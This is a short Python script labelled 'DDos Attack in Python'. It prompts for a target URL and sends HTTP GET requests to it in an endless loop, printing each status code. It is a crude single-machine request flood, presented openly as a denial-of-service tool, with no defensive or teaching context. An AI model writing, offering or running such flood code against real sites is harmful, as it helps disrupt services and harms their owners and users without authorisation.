# DDos Attack in Python
import requests

target = input("Enter the target URL: ")

while True:
    r = requests.get(target)
    print(r.status_code)
